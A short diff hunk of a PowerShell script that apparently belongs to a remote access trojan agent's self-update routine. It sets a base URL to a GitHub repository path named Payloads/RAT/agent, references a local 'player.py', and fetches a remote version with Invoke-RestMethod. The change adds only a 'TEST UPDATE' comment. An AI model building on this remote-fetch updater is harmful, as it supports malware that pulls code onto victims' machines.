@@ -3,6 +3,7 @@ $baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/main/RAT/agent/
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $playerPath = Join-Path $scriptDir "player.py"
 
+############################ TEST UPDATE #####################################
 
 $remote = Invoke-RestMethod -Uri $versionUrl
 
